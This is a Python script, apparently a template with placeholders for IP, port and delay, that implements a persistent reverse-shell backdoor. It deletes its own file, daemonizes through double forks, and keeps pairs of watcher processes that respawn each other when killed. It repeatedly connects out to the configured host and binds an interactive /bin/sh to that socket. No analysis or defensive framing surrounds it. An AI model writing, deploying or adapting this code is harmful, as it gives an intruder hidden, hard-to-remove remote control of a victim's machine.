import multiprocessing
import os
import time
import sys
import fcntl
import threading
import socket
import base64
import urllib
import subprocess

UMASK = 0
WORKDIR = "/"
MAXFD = 1024
os.system("rm -rf ./kekong.py")

if (hasattr(os, "devnull")):
   REDIRECT_TO = os.devnull
else:
   REDIRECT_TO = "/dev/null"


def createDaemon():
   try:
      pid = os.fork()
   except OSError, e:
      raise Exception, "%s [%d]" % (e.strerror, e.errno)


   if (pid == 0):
      os.setsid()
      try:
         pid = os.fork()
      except OSError, e:
         raise Exception, "%s [%d]" % (e.strerror, e.errno)


      if (pid == 0):
         os.chdir(WORKDIR)
         os.umask(UMASK)
      else:
         os._exit(0)
   else:
      os._exit(0)

   import resource
   maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
   if (maxfd == resource.RLIM_INFINITY):
      maxfd = MAXFD

   os.open(REDIRECT_TO, os.O_RDWR)
   os.dup2(1, 2)
   os.dup2(0, 2)

   return(0)



def LsnrWatcher(second):
    while True:
        s =None
        try:
            s =second.recv(1)
        except:
            pass
        try:
            second.close()
        except:
            pass

        (first,second) =socket.socketpair()
        if(os.fork()==0):
            createDaemon()
            second.close()
            Lsnr(first)
            os._exit(0)
        first.close()


def LsnrThread(first):
    while True:
        s =None
        try:
            s =first.recv(1)
        except:
            pass
        try:
            first.close()
        except:
            pass

        (first,second) =socket.socketpair()
        if(os.fork()==0):
            createDaemon()
            first.close()
            LsnrWatcher(second)
            os._exit(0)
        second.close()


def Lsnr(first):
    th =threading.Thread(target=LsnrThread,args=(first,))
    th.daemon =False
    th.start()

    while 1:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("{ip}",{port}))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            p=subprocess.call(["/bin/sh","-i"])
            time.sleep({time})
        except:
            pass


def StartLsnr():
    (first,second) =socket.socketpair()
    if(os.fork()==0):
        createDaemon()
        second.close()
        Lsnr(first)
        os._exit(0)
    if(os.fork()==0):
        createDaemon()
        first.close()
        LsnrWatcher(second)
        os._exit(0)
    first.close()
    second.close()


def RunMain():
    StartLsnr()
    time.sleep(300)


if __name__ == '__main__':
    createDaemon()
    RunMain()
